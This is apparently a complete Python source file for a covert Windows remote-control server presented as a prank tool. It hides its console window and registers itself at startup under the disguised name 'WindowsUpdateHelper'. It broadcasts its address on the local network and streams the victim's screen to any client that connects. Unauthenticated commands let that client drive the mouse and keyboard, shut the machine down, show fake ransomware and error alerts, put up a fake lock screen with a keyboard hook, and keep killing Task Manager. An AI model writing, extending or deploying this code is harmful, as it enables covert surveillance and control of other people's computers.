import socket
import threading
import zlib
import time
import sys
import os
import subprocess
import importlib

for _imp, _pip in [('numpy', 'numpy'), ('cv2', 'opencv-python-headless'), ('pyautogui', 'pyautogui'),
                    ('keyboard', 'keyboard'), ('pynput', 'pynput'), ('psutil', 'psutil'), ('mss', 'mss')]:
    try:
        importlib.import_module(_imp)
    except ImportError:
        print(f"Installing {_pip}...")
        subprocess.check_call([sys.executable or 'python', '-m', 'pip', 'install', _pip],
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

import numpy as np
import cv2
import pyautogui
pyautogui.FAILSAFE = False
import keyboard as kb
from pynput.keyboard import Controller, Key
import psutil


def get_lan_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('10.255.255.255', 1))
        ip = s.getsockname()[0]
    except:
        ip = '127.0.0.1'
    finally:
        s.close()
    return ip


def get_subnet_broadcast(ip, mask='255.255.255.0'):
    parts = ip.split('.')
    return f"{parts[0]}.{parts[1]}.{parts[2]}.255"


class RemoteControlServer:
    def __init__(self, host='0.0.0.0', port=65432):
        self.host = host
        self.port = port
        self.server_socket = None
        self.client_socket = None
        self.running = False
        self.reverse_mouse = False
        self.keyboard_controller = Controller()
        self.keyboard_capture_active = False
        self.block_taskmgr = False
        self.locked = False
        self.lock_window = None
        self.autoclick_active = False
        self.automove_active = False
        self._kb_hook = None

    def broadcast_ip(self):
        lan_ip = get_lan_ip()
        msg = f"{lan_ip}:{self.port}"
        subnet_bc = get_subnet_broadcast(lan_ip)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        targets = ['255.255.255.255', subnet_bc]
        while self.running:
            for t in targets:
                try:
                    sock.sendto(msg.encode(), (t, 45631))
                except:
                    pass
            time.sleep(2)

    def hide_console(self):
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass

    def add_to_startup(self):
        try:
            import winreg
            exe = os.environ.get('ORIG_EXE_PATH') or os.path.abspath(sys.argv[0])
            if not exe.lower().endswith('.exe'):
                return
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "WindowsUpdateHelper", 0, winreg.REG_SZ, exe)
            winreg.CloseKey(key)
        except:
            pass

    def start(self):
        self.hide_console()
        self.add_to_startup()
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(1)
        self.running = True

        taskmgr_thread = threading.Thread(
            target=self.monitor_task_manager,
            daemon=True
        )
        taskmgr_thread.start()

        broadcast_thread = threading.Thread(
            target=self.broadcast_ip,
            daemon=True
        )
        broadcast_thread.start()

        lan_ip = get_lan_ip()
        print(f"Server started on {self.host}:{self.port}")
        print(f"LAN IP: {lan_ip}:{self.port}")
        print(f"Waiting for connections...")

        try:
            while self.running:
                self.client_socket, addr = self.server_socket.accept()
                print(f"Connected by {addr}")

                client_thread = threading.Thread(
                    target=self.handle_client,
                    args=(self.client_socket,),
                    daemon=True
                )
                client_thread.start()

        except KeyboardInterrupt:
            print("\nShutting down server...")
        finally:
            self.stop()

    def stop(self):
        self.running = False
        if self.client_socket:
            self.client_socket.close()
        if self.server_socket:
            self.server_socket.close()
        print("Server stopped")

    def stream_screens(self, client_socket):
        import mss
        with mss.mss() as sct:
            while self.running:
                try:
                    img = cv2.cvtColor(np.array(sct.grab(sct.monitors[0])), cv2.COLOR_BGRA2BGR)
                    _, enc = cv2.imencode('.jpg', img, [cv2.IMWRITE_JPEG_QUALITY, 40])
                    client_socket.sendall(len(enc).to_bytes(4, 'big') + enc.tobytes())
                except:
                    break

    def handle_client(self, client_socket):
        threading.Thread(target=self.stream_screens, args=(client_socket,), daemon=True).start()
        try:
            while self.running:
                command = client_socket.recv(4096).decode().strip()
                if not command:
                    break
                self.process_command(command)
        except ConnectionResetError:
            print("Client disconnected")
        except Exception as e:
            print(f"Client error: {e}")
        finally:
            client_socket.close()
            print("Client connection closed")

    def bg(self, target, args=()):
        threading.Thread(target=target, args=args, daemon=True).start()

    def process_command(self, command):
        try:
            parts = command.split()
            cmd = parts[0].lower()

            if cmd == "move" and len(parts) == 3:
                x, y = map(int, parts[1:3])
                pyautogui.moveRel(x, y)

            elif cmd == "click" and len(parts) == 2:
                pyautogui.click(button=parts[1].lower())

            elif cmd == "click_at" and len(parts) == 3:
                x, y = int(parts[1]), int(parts[2])
                pyautogui.moveTo(x, y)
                pyautogui.click()

            elif cmd == "automove":
                self.bg(self._automove, (parts,))

            elif cmd == "autoclick":
                self.bg(self._autoclick, (parts,))

            elif cmd == "rick":
                self.bg(self.play_rick_roll)

            elif cmd == "fake_virus":
                self.bg(self.show_fake_virus)

            elif cmd == "shutdown":
                os.system("shutdown /s /t 1")

            elif cmd == "fake_error":
                self.bg(self.show_fake_error)

            elif cmd == "reverse_mouse":
                self.reverse_mouse = not self.reverse_mouse

            elif cmd == "type":
                self.keyboard_controller.type(' '.join(parts[1:]))

            elif cmd == "open" and len(parts) > 1:
                self.bg(self._open_url, (parts,))

            elif cmd == "key" and len(parts) > 1:
                self.press_key(parts[1])

            elif cmd == "special_key" and len(parts) > 1:
                self.press_special_key(parts[1])

            elif cmd == "block_taskmgr":
                self.block_taskmgr = not self.block_taskmgr

            elif cmd == "lock_screen":
                self.bg(self.lock_screen)

            elif cmd == "unlock":
                self.bg(self.unlock_screen)

            elif cmd == "exit":
                self.running = False

        except Exception as e:
            print(f"Command error: {e}")

    def _automove(self, parts):
        if self.automove_active:
            return
        self.automove_active = True
        try:
            speed = 0.5 if len(parts) < 2 else float(parts[1])
            pyautogui.moveRel(100, 0, duration=speed)
            pyautogui.moveRel(0, 100, duration=speed)
            pyautogui.moveRel(-100, 0, duration=speed)
            pyautogui.moveRel(0, -100, duration=speed)
        finally:
            self.automove_active = False

    def _autoclick(self, parts):
        if self.autoclick_active:
            return
        self.autoclick_active = True
        try:
            interval = 1.0 if len(parts) < 2 else float(parts[1])
            duration = float(parts[2]) if len(parts) > 2 else 10.0
            end = time.time() + duration
            while time.time() < end and self.running:
                pyautogui.click()
                time.sleep(interval)
        finally:
            self.autoclick_active = False

    def _open_url(self, parts):
        import webbrowser
        webbrowser.open(' '.join(parts[1:]))

    def lock_screen(self):
        self.locked = True
        try:
            import ctypes
            from ctypes import wintypes
            user32 = ctypes.windll.user32
            kernel32 = ctypes.windll.kernel32
            HOOKPROC = ctypes.WINFUNCTYPE(wintypes.LPARAM, wintypes.INT, wintypes.WPARAM, wintypes.LPARAM)
            def proc(nCode, wParam, lParam):
                if nCode >= 0:
                    return 1
                return user32.CallNextHookEx(None, nCode, wParam, lParam)
            self._kb_hook_proc = HOOKPROC(proc)
            self._kb_hook = user32.SetWindowsHookExW(13, self._kb_hook_proc, kernel32.GetModuleHandleW(None), 0)
        except:
            pass
        try:
            import tkinter as tk
            import ctypes
            user32 = ctypes.windll.user32
            vx = user32.GetSystemMetrics(76)
            vy = user32.GetSystemMetrics(77)
            vw = user32.GetSystemMetrics(78)
            vh = user32.GetSystemMetrics(79)
            win = tk.Tk()
            win.overrideredirect(True)
            win.geometry(f"{vw}x{vh}+{vx}+{vy}")
            win.attributes('-topmost', True)
            win.configure(bg='#0078d7')
            win.focus_force()
            win.lift()
            win.grab_set()
            frame = tk.Frame(win, bg='#0078d7')
            frame.pack(expand=True, fill='both')
            tk.Label(frame, text="Windows Locked", fg='white', bg='#0078d7',
                     font=('Segoe UI', 48, 'bold')).pack(pady=(150, 20))
            tk.Label(frame, text="This computer has been locked by the system administrator.", fg='#cce5ff', bg='#0078d7',
                     font=('Segoe UI', 16)).pack(pady=10)
            tk.Label(frame, text="Enter password to unlock", fg='#cce5ff', bg='#0078d7',
                     font=('Segoe UI', 14)).pack(pady=30)
            pw_frame = tk.Frame(frame, bg='#0078d7')
            pw_frame.pack()
            tk.Label(pw_frame, text="Password:", fg='white', bg='#0078d7',
                     font=('Segoe UI', 14)).pack(side='left', padx=10)
            pw = tk.Entry(pw_frame, show='*', font=('Segoe UI', 14), width=20)
            pw.pack(side='left')
            pw.focus_force()
            self.lock_window = win
            win.mainloop()
        except Exception as e:
            print(f"Lock screen error: {e}")

    def unlock_screen(self):
        self.locked = False
        if self.lock_window:
            try:
                self.lock_window.grab_release()
                self.lock_window.after(0, self.lock_window.destroy)
            except:
                pass
            self.lock_window = None
        try:
            if self._kb_hook:
                ctypes.windll.user32.UnhookWindowsHookEx(self._kb_hook)
                self._kb_hook = None
        except:
            pass

    def kill_task_manager(self):
        try:
            import psutil
            for proc in psutil.process_iter(['name', 'pid']):
                try:
                    if proc.info['name'] and proc.info['name'].lower() == 'taskmgr.exe':
                        proc.kill()
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
        except:
            pass
        import subprocess
        subprocess.run(['taskkill', '/f', '/im', 'Taskmgr.exe'], capture_output=True, shell=True)
        try:
            import ctypes
            from ctypes import wintypes
            user32 = ctypes.windll.user32
            enum_proc = ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM)
            def callback(hwnd, lparam):
                titles = ('Task Manager', 'Диспетчер задач', 'TaskManagerWindow')
                buf = ctypes.create_unicode_buffer(256)
                user32.GetWindowTextW(hwnd, buf, 256)
                for t in titles:
                    if t in buf.value:
                        user32.PostMessageW(hwnd, 0x0010, 0, 0)
                        break
                cls = ctypes.create_unicode_buffer(64)
                user32.GetClassNameW(hwnd, cls, 64)
                if 'TaskManager' in cls.value:
                    user32.PostMessageW(hwnd, 0x0010, 0, 0)
                return True
            user32.EnumWindows(enum_proc(callback), 0)
        except:
            pass

    def monitor_task_manager(self):
        while self.running:
            if self.block_taskmgr:
                self.kill_task_manager()
            time.sleep(0.3)

    def press_key(self, key):
        try:
            self.keyboard_controller.press(key)
            time.sleep(0.05)
            self.keyboard_controller.release(key)
        except Exception as e:
            print(f"Error pressing key {key}: {e}")

    def press_special_key(self, key_name):
        try:
            special_keys = {
                'ctrl': Key.ctrl, 'shift': Key.shift, 'alt': Key.alt,
                'enter': Key.enter, 'esc': Key.esc, 'space': Key.space,
                'tab': Key.tab, 'backspace': Key.backspace, 'delete': Key.delete,
                'up': Key.up, 'down': Key.down, 'left': Key.left, 'right': Key.right
            }
            key = special_keys.get(key_name.lower())
            if key:
                self.keyboard_controller.press(key)
                time.sleep(0.05)
                self.keyboard_controller.release(key)
        except Exception as e:
            print(f"Error pressing special key {key_name}: {e}")

    def send_screenshot(self):
        try:
            img = pyautogui.screenshot()
            img = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
            _, img_encoded = cv2.imencode('.jpg', img, [cv2.IMWRITE_JPEG_QUALITY, 70])
            compressed = zlib.compress(img_encoded.tobytes())
            size = len(compressed)
            size_bytes = size.to_bytes(4, 'big')
            return size_bytes + compressed
        except Exception as e:
            print(f"Error sending screenshot: {e}")
            return "Error"

    def play_rick_roll(self):
        try:
            os.system('start https://www.youtube.com/watch?v=dQw4w9WgXcQ')
        except:
            pass

    def show_fake_virus(self):
        try:
            import tkinter as tk
            win = tk.Tk()
            win.title("Virus Alert")
            win.geometry("500x300+{}+{}".format(
                (win.winfo_screenwidth()-500)//2, (win.winfo_screenheight()-300)//2))
            win.configure(bg='#1a0000')
            win.attributes('-topmost', True)
            win.focus_force()
            win.lift()
            tk.Label(win, text="CRITICAL ERROR", fg='#ff0000', bg='#1a0000',
                     font=('Arial', 28, 'bold')).pack(pady=30)
            tk.Label(win, text="Your computer has been infected!\nAll files will be encrypted.",
                     fg='#ff6666', bg='#1a0000', font=('Arial', 14)).pack(pady=10)
            tk.Button(win, text="OK", command=win.destroy, bg='#330000',
                      fg='#fff', font=('Arial', 12)).pack(pady=20)
            win.mainloop()
        except:
            pass

    def show_fake_error(self):
        try:
            import tkinter as tk
            win = tk.Tk()
            win.title("System Error")
            win.geometry("480x250+{}+{}".format(
                (win.winfo_screenwidth()-480)//2, (win.winfo_screenheight()-250)//2))
            win.configure(bg='#000033')
            win.attributes('-topmost', True)
            win.focus_force()
            win.lift()
            tk.Label(win, text="SYSTEM CRITICAL ERROR", fg='#4488ff', bg='#000033',
                     font=('Arial', 22, 'bold')).pack(pady=30)
            tk.Label(win, text="Windows has encountered a critical error!\nError code: 0x80070002\n\n"
                     "The system will shut down automatically.",
                     fg='#88bbff', bg='#000033', font=('Arial', 13)).pack(pady=10)
            tk.Button(win, text="Close", command=win.destroy, bg='#001133',
                      fg='#fff', font=('Arial', 12)).pack(pady=20)
            win.mainloop()
        except:
            pass


if __name__ == "__main__":
    try:
        import keyboard
        from pynput.keyboard import Controller
        import psutil
    except ImportError as e:
        print(f"Error: Required library not found - {e}")
        print("Please install with: pip install pyautogui keyboard pynput psutil")
        sys.exit(1)

    server = RemoteControlServer()
    try:
        server.start()
    except KeyboardInterrupt:
        server.stop()
